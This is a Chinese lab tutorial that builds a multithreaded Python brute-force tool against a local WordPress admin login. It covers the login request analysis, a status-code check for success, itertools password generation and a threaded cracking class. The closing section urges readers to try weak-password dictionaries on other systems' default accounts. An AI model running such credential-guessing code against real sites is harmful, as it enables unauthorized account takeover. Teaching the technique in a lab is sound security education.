# Python暴力猜解Web应用  

## 一、实验说明  

本实验使用wordpress作为测试对象，使用模拟登陆和暴力猜解来获取wordpress管理员的登录密码。  

### 1.1 知识点  

1. wordpress安装配置  
2. 模拟登陆  
3. Python requests/threading/itertools/Queue 包的使用  
4. 多线程暴力破解  

### 1.2 效果图  

![最终效果](https://dn-anything-about-doc.qbox.me/document-uid125847labid2134timestamp1474820823542.png/wm)  

### 1.3 实验准备  

#### 1)下载并安装wordpress  

首先安装并我们用到的CMS即`wordpress`，以下简称`wp`。  

```
$ sudo apt-get update
$ sudo apt-get install wordpress
$ sudo cp /usr/share/wordpress /var/www/html -rf
$ cd /var/www/html/
$ sudo chown -R www-data:www-data wordpress
$ sudo touch /etc/wordpress/config-localhost.php
```

#### 2)配置数据库及 wordpress 账号  
使用mysql数据库作为 wordpress 的数据库，创建 wordpress 将会用到的数据库和相应的数据库用户账号并分配权限。  

```
$ sudo service mysql start
$ mysql -u root
>create database wordpress;
>create user wordpress@localhost identified by '666';
>grant create,drop,insert,delete,update,select on wordpress.* to wordpress@localhost;
```

然后按 ctrl + D ，退出 mysql。  

#### 3)配置部署 wordpress  
在 wordpress 的配置文件中指定数据库用户的账号和密码，并创建后台管理员账号。  

```
$ cd /var/www/html/wordpress
$ sudo vim wp-config.php
```

在配置文件中找到以下几行，并添加对于密码的设定：  

![数据库密码设定](https://dn-anything-about-doc.qbox.me/document-uid125847labid2134timestamp1474619093666.png/wm)  

保存配置后，启动apache2服务，然后再浏览器中输入`http://localhost/wordpress/wp-admin/install.php`配置管理员用户名与密码。  

```
$ sudo service apache2 start
```
此处我们设置账号为`shiyanlou`,6位密码为`syl666`,设置好后点击`Install WordPress`即可。  

![管理员账号配置](https://dn-anything-about-doc.qbox.me/document-uid125847labid2134timestamp1474619883617.png/wm)  

如果浏览器没有自动跳转，可手动输入`http://localhost/wordpress/wp-login.php`进入登录页，可使用之前配置的账号来登入后台。  

## 二、破解过程分析  

需要理清登陆过程，弄懂破解原理才能够在使用时得心应手，以下从两个方面展开。  

### 2.1 登录分析  

在浏览器中输入`http://localhost/wordprss/wp-login.php`进入登录页，通过右键菜单中的`检查元素`打开firefox调试工具，跳转到`网络`选项卡。接着在浏览器中输入错误的密码，查看请求参数。  

![登录请求参数](https://dn-anything-about-doc.qbox.me/document-uid125847labid2134timestamp1474621730669.png/wm)  

登录时发送的的cookie：  

![登录带的cookie](https://dn-anything-about-doc.qbox.me/document-uid125847labid2134timestamp1474621756181.png/wm)  

无论是输入正确的密码还是错误的密码，这些登录需要提交的参数是不会改变的。并且只要登录成功，服务器一定会返回包含sessionid的cookie。整理后的发送参数如下：  


| 参数名称  | 参数值  |
|:----------|:--------|
| log | 用户名 |
| pwd | 密码 |
| wp-submit | 固定值`Log In` |
| redirect_to | 管理员首页链接`http://localhost/wordpress/wp-admin` |
| test_cookie | 固定值`1` |
| Cookie:wordpress_test_cookie | 固定值`WP Cookie check` |


**注意：**空格在html编码后变成`+`，图中的`+`原本是空格  

### 2.2 破解分析  

#### 暴力猜解简述  

暴力破解法就是列举法，将口令集合中的每一个口令一一尝试直到登录成功；有时候结合字典效率高一点，不过字典不一定猜得准。可以说它是一种“笨”办法，但有时候却是唯一的办法。它是在查找漏洞一筹莫展的时候，在漏洞利用不顺利的时候你所能依靠的方法。一个固若金汤的网站可能几乎找不到漏洞，但粗心的管理员却有可能使用了弱口令，就算我们没找到攻破整套系统的方法，但是只要知道了管理员的口令，同样能够达到修改系统的最终目的。  

| 类型 | 测试口令空间 | 特点 | 可优化措施 |
|:-----|:-------------|:-----|:-----------|
| 暴力破解 | 口令字符的全部排列组合 | 一定有解，但计算开销巨大，一般在口令空间较小时使用 | 减小口令空间，硬件加速计算 |
| 字典攻击 | 预先准备的口令字典 | 字典的好坏决定成功率，一般用于弱口令破解 | 结合用户信息定制字典 |

#### 破解流程  

暴力破解可以自动化平时手动一个个试密码的过程，并且程序的速度更快，破解的一般流程如下。  

![流程](https://dn-anything-about-doc.qbox.me/document-uid125847labid2134timestamp1474624669380.png/wm)  

#### 口令空间  

口令由字符组成，这些字符构成的所有的字符串组成了口令空间。以数字密码为例，字符集合为0~9的阿拉伯数字，密码长度为6时共有`10^6`种可能性，要暴力破解就是一一尝试这10万个口令直到找到正确的口令。假设在一般条件下一次登录的http请求和响应耗时1s，那么10w个请求将耗时277个小时，按一天24小时算，折合成11天。如果使用11个线程并行破解，就只需要1天的时间。当然物理硬件性能越好，破解速度越快。由于这种破解方法建立在"猜"之上，因此口令数量很庞大，这点不可避免。但是结合人的行为习惯，可以从社会工程学的角度上减少组成口令的字符集的大小，从而减小口令空间。  

由于虚拟机环境限制，简化下复杂度。假定这个wordpress由实验楼团队维护，那么管理员作为团队成员更有可能会用`syl`这三个字符;有空会玩LOL,可能会更加倾向于使用数字`6`;并且他要经常登录后台进行管理，为了省事将密码设置的比较短，6位左右的长度。我们使用`lsy6`作为他口令的字符集合来编写程序实现猜解过程。  

## 三、用Python实现

### 3.1 模拟登陆函数

#### 功能需求

可以独立的发送一次登录请求并通过解析返回参数判断登录是否成功，返回布尔类型。

#### 代码实现

从之前的分析可以发现登录失败时的响应状态为200，而登录成功之后页面会重定向到管理页面，因此响应状态码肯定是302，可以根据这一点来简单判断登录是否成功。登录函数代码如下：

```py
def login(user,pwd):
    url = 'http://localhost/wordpress/wp-login.php'
    values = {'log':user,'pwd':pwd,'wp-submit':'Log In',
            'redirect_to':'http://localhost/wordpress/wp-admin',
            'test_cookie':'1'
    }
    my_cookie = {'wordpress_test_cookie':'WP Cookie check'}
    r = requests.post(url,data=values,cookies=my_cookie)
    if r.status_code == 302：
        return True
    return False
```

### 3.2 暴力破解类  
编写一个破解类`Bruter`来实现所有相关的功能，这个类包含以下功能:  

1. 模拟登录
2. 测试口令生成
3. 多个线程破解
4. 破解进度通知

模拟登陆的功能由之前实现的`login`函数完成，实验demo的口令生成过程比较简单，可以放在构造函数中。编写`brute`函数来负责破解子线程的生成，线程函数为`web_bruter`。首先编写构造函数：

```
# characters为字符串，包含组成口令的所有字符
# threads为线程个数，pwd_len为生成的测试口令的长度
def __init__(self,user,characters,pwd_len,threads):
		self.user = user
		self.found = False
        	self.threads = threads
		print '构建待测试口令队列中...'
		self.pwd_queue = Queue.Queue()
		for pwd in list(itertools.product(characters,repeat=pwd_len)):
			self.pwd_queue.put(''.join(pwd))
		self.result = None
		print '构建成功!'
```

类中各属性意义如下：

| 属性名 | 含义 | 类型 |
|:-------|:-----|:-----|
| user | 用户账号名称 | 字符串 |
| found | 破解成功的标志 | 布尔值 |
| pwd_queue | 包含所有测试口令的队列Queue | Queue对象 |
| result | 最终破解出的正确口令 | 字符串 |

接着是破解子线程函数`web_bruter`,将它设为私有函数。循环从口令队列中获取测试口令并进行模拟登录测试。如果登录成功，将破解成功的标志属性`self.found`设为`True`以提醒其他线程停止猜解;此外，将当前测试口令保存到`self.result`中，并打印出破解成功的信息。

```
def __web_bruter(self):
		while not self.pwd_queue.empty() and not self.found:
			pwd_test = self.pwd_queue.get()
			if self.__login(pwd_test):
				self.found = True
				self.result = pwd_test
				print '破解 %s 成功，密码为: %s' % (self.user,pwd_test)
			else:
				self.found = False
```

类中的`__login`函数修改下参数即可，此处不再重列。


最后是主线程函数`brute`，由它生成子线程并汇报破解进度。

```
def brute(self):
		for i in range(self.threads):
			t = threading.Thread(target=self.__web_bruter)
			t.start()
			print '破解线程-->%s 启动' % t.ident
		while(not self.pwd_queue.empty()):
			sys.stdout.write('\r 进度: 还剩余%s个口令 (每1s刷新)' % self.pwd_queue.qsize())
			sys.stdout.flush()
			time.sleep(1)
		print '\n破解完毕'
```

Bruter类写好之后便可以通过生成它的对象来进行破解了。

### 3.3 运行测试

希望大家尽量自己完成代码的编写，增加python的熟练度。完整代码请参见`http://labfile.oss.aliyuncs.com/courses/663/wp_bp.py`。为了方便使用，我在代码中添加了命令行参数的功能，为了简化，没有加异常判断的代码。可以按照以下格式使用:  

```
用法 : cmd [用户名] [密码字符] [密码长度] [线程数]
```

其中`cmd`代表脚本的名称，最终执行效果见文首。  

## 四、总结  

本实验使用Python实现暴力猜解wordpress管理员登录表单的功能，并使用多线程、破解队列来优化破解过程。在实际应用中常常结合弱口令和用户个人信息组成的口令集合来进行猜解，一般会取得不错的结果。口令集合的选取很重要，可以说完全决定了破解的成败。但无论什么样的口令集合，最终的破解过程都是相同的。学有余力的同学可以尝试使用弱口令字典破解其他系统的默认账号密码(可百度`弱口令字典`,此处不便列出)，或者使用异步IO来优化破解性能：  

[初探Python3的异步IO编程](http://www.keakon.net/2015/09/07/初探Python3的异步IO编程)  